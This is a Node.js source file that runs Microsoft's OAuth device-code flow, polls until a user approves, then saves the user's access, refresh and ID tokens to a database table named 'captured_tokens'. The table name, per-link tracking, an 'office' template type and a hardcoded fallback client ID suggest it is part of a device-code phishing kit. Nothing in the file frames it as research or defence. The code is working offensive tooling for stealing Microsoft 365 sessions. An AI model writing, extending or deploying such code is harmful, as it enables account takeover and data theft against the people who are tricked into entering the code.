const axios = require('axios');
const db = require('../database/connection');
const { encrypt } = require('../utils/encrypt');
const config = require('../config/env');

const TENANT = config.AZURE_TENANT || 'common';
const CLIENT_ID = config.AZURE_CLIENT_ID;

async function requestDeviceCode() {
  const response = await axios.post(
    `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
    new URLSearchParams({
      client_id: CLIENT_ID,
      scope: 'offline_access openid profile https://graph.microsoft.com/User.Read',
    }),
    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
  );

  return {
    device_code: response.data.device_code,
    user_code: response.data.user_code,
    verification_uri: response.data.verification_uri,
    expires_in: response.data.expires_in,
    interval: response.data.interval || 5,
    message: response.data.message,
  };
}

async function pollForTokens(deviceCode, linkId, userId, initialInterval) {
  const maxAttempts = 60;
  let attempts = 0;
  let interval = initialInterval || 5; // Use server-recommended interval (seconds)

  while (attempts < maxAttempts) {
    attempts++;
    await new Promise(resolve => setTimeout(resolve, interval * 1000));

    try {
      const response = await axios.post(
        `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: CLIENT_ID,
          device_code: deviceCode,
        }),
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );

      // Tokens received
      const { access_token, refresh_token, id_token, scope } = response.data;

      // Decode id_token for email
      let email = null;
      if (id_token) {
        try {
          const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
          email = payload.email || payload.upn || payload.preferred_username || null;
        } catch (e) { /* ignore decode errors */ }
      }

      // Determine tenant from config
      const tenant = config.AZURE_TENANT || 'common';

      // Store encrypted with client_id tracking
      const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
      await db.query(
        'INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?)',
        [
          userId,
          linkId,
          email,
          'token',
          encrypt(access_token),
          encrypt(refresh_token),
          encrypt(id_token),
          '0.0.0.0',
          'Device Code Flow',
          tenant,
          'office',
          clientIdUsed
        ]
      );

      return { success: true, email, access_token, refresh_token };
    } catch (err) {
      const errorCode = err.response?.data?.error || '';

      if (errorCode === 'authorization_pending') {
        // User has not yet authorized - continue polling with same interval
        continue;
      }

      if (errorCode === 'slow_down') {
        // Microsoft is rate-limiting - increase interval by 5 seconds
        interval = interval + 5;
        continue;
      }

      if (errorCode === 'authorization_declined') {
        return { success: false, error: 'User declined authorization' };
      }

      if (errorCode === 'expired_token') {
        return { success: false, error: 'Code expired' };
      }

      if (attempts >= maxAttempts) {
        return { success: false, error: 'Timeout waiting for user' };
      }

      // For other errors, continue polling
    }
  }

  return { success: false, error: 'Timeout' };
}

module.exports = { requestDeviceCode, pollForTokens };
